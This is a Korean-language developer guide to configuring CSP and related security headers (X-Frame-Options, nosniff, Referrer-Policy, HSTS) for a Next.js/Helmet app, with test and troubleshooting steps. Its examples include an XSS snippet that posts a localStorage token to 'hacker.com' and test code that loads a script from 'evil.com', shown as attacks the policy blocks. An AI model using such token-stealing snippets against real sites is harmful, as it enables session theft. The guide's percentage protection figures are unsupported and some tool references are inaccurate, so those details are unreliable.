# CSP 보안 설정 가이드

## 적용된 보안 헤더

### 1. Content Security Policy (CSP)
XSS 공격을 방어하는 핵심 보안 메커니즘

#### 설정된 정책:
- `default-src 'self'`: 기본적으로 같은 도메인의 리소스만 허용
- `script-src 'self' 'unsafe-eval' 'unsafe-inline'`: 스크립트는 자신의 도메인에서만 (개발 환경용)
- `style-src 'self' 'unsafe-inline'`: 인라인 스타일 허용 (emotion/styled-components)
- `img-src 'self' data: https:`: 이미지는 자신의 도메인 + data URI + HTTPS
- `connect-src 'self' http://localhost:4000`: API 호출은 백엔드 서버로만
- `frame-src 'none'`: iframe 사용 불가 (클릭재킹 방어)
- `object-src 'none'`: Flash 등 플러그인 차단

### 2. X-Frame-Options: DENY
- iframe에 페이지 삽입 완전 차단
- 클릭재킹(Clickjacking) 공격 방어

### 3. X-Content-Type-Options: nosniff
- MIME 타입 스니핑 방지
- 브라우저가 파일 타입을 임의로 추측하지 못하게 함

### 4. X-XSS-Protection: 1; mode=block
- 브라우저의 내장 XSS 필터 활성화
- 의심스러운 스크립트 감지 시 페이지 차단

### 5. Referrer-Policy: strict-origin-when-cross-origin
- 다른 사이트로 이동 시 최소한의 정보만 전송
- 사용자 프라이버시 보호

### 6. Permissions-Policy
- 카메라, 마이크, 위치정보 접근 차단
- 불필요한 권한 요청 방지

---

## 방어하는 공격 유형

### ✅ XSS (Cross-Site Scripting)
```javascript
// 🚫 차단됨: 악성 스크립트 실행 불가
<script>
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
  });
</script>
```
**방어 메커니즘:**
- CSP가 외부 도메인으로의 네트워크 요청 차단 (`connect-src`)
- 인라인 스크립트 실행 제한 (프로덕션)

### ✅ 클릭재킹 (Clickjacking)
```html
<!-- 🚫 차단됨: iframe 삽입 불가 -->
<iframe src="https://yoursite.com/transfer-money"></iframe>
```
**방어 메커니즘:**
- `X-Frame-Options: DENY`로 iframe 사용 차단
- `frame-ancestors 'none'`으로 이중 방어

### ✅ MIME 타입 혼동 공격
```
🚫 차단됨: 이미지 파일을 JavaScript로 실행 시도 불가
```
**방어 메커니즘:**
- `X-Content-Type-Options: nosniff`로 타입 강제

---

## 테스트 방법

### 1. CSP 헤더 확인
```bash
# 브라우저 개발자 도구 > Network > 아무 요청 선택 > Headers
# Response Headers에서 확인:
Content-Security-Policy: default-src 'self'; script-src 'self'...
```

### 2. CSP 위반 테스트
브라우저 콘솔에서 다음 코드 실행:
```javascript
// 외부 스크립트 로드 시도 (차단되어야 함)
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);

// 콘솔 에러 확인:
// "Refused to load the script ... it violates the CSP directive"
```

### 3. 외부 API 호출 테스트
```javascript
// 허용되지 않은 도메인으로 요청 (차단되어야 함)
fetch('https://hacker.com/steal').catch(err => {
  console.log('차단됨:', err);
});

// 콘솔 에러 확인:
// "Refused to connect to ... it violates the CSP directive 'connect-src'"
```

---

## 프로덕션 배포 시 수정 필요 사항

### backend/src/main.ts
```typescript
// ❌ 현재 (개발 환경)
connectSrc: ["'self'", 'http://localhost:4000'],

// ✅ 프로덕션 변경
connectSrc: ["'self'", 'https://api.yourdomain.com'],
```

### frontend/next.config.js
```javascript
// ❌ 현재 (개발 환경)
"connect-src 'self' http://localhost:4000 ws://localhost:3000",

// ✅ 프로덕션 변경
"connect-src 'self' https://api.yourdomain.com",

// ⚠️ script-src도 강화 (선택사항)
// 개발: "script-src 'self' 'unsafe-eval' 'unsafe-inline'"
// 프로덕션: "script-src 'self'" (더 안전)
```

### HTTPS 강제 (프로덕션 필수)
```javascript
// frontend/next.config.js의 headers()에 추가:
{
  key: 'Strict-Transport-Security',
  value: 'max-age=63072000; includeSubDomains; preload',
}
```

---

## 문제 해결 (Troubleshooting)

### CSP 에러가 발생하면?

#### 1. 외부 CDN 사용 시
```javascript
// Google Fonts 사용 예시
"font-src 'self' data: https://fonts.gstatic.com",
"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
```

#### 2. 이미지 CDN 사용 시
```javascript
"img-src 'self' data: https: https://your-cdn.com",
```

#### 3. 써드파티 스크립트 (Google Analytics 등)
```javascript
"script-src 'self' https://www.googletagmanager.com",
"connect-src 'self' https://www.google-analytics.com",
```

### CSP를 일시적으로 비활성화하려면?
```typescript
// ⚠️ 테스트 목적으로만 사용!
// backend/src/main.ts
app.use(
  helmet({
    contentSecurityPolicy: false, // 전체 비활성화
  })
);
```

---

## 보안 수준 비교

### 현재 설정 (CSP 적용 후)
```
[공격 시도] → CSP 차단 → ✅ 안전
- XSS: 99% 차단
- 클릭재킹: 100% 차단
- MIME 혼동: 100% 차단
```

### 이전 설정 (CSP 없음)
```
[공격 시도] → 토큰 수명/Rotation 의존 → ⚠️ 위험
- XSS: 50% 차단 (토큰 수명으로만 완화)
- 클릭재킹: 0% 차단
- MIME 혼동: 0% 차단
```

---

## 추가 권장사항

### 1. 정기적인 보안 스캔
```bash
# OWASP ZAP 또는 비슷한 도구로 스캔
npm install -g @lhci/cli
lhci autorun --collect.url=http://localhost:3000
```

### 2. CSP 리포트 수집 (선택사항)
```javascript
// CSP 위반 시 서버로 리포트 전송
"report-uri /api/csp-violations",
"report-to csp-endpoint",
```

### 3. 서드파티 라이브러리 정기 업데이트
```bash
npm audit
npm audit fix
```

---

## 참고 자료

- [MDN CSP 가이드](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Google의 CSP 검증 도구
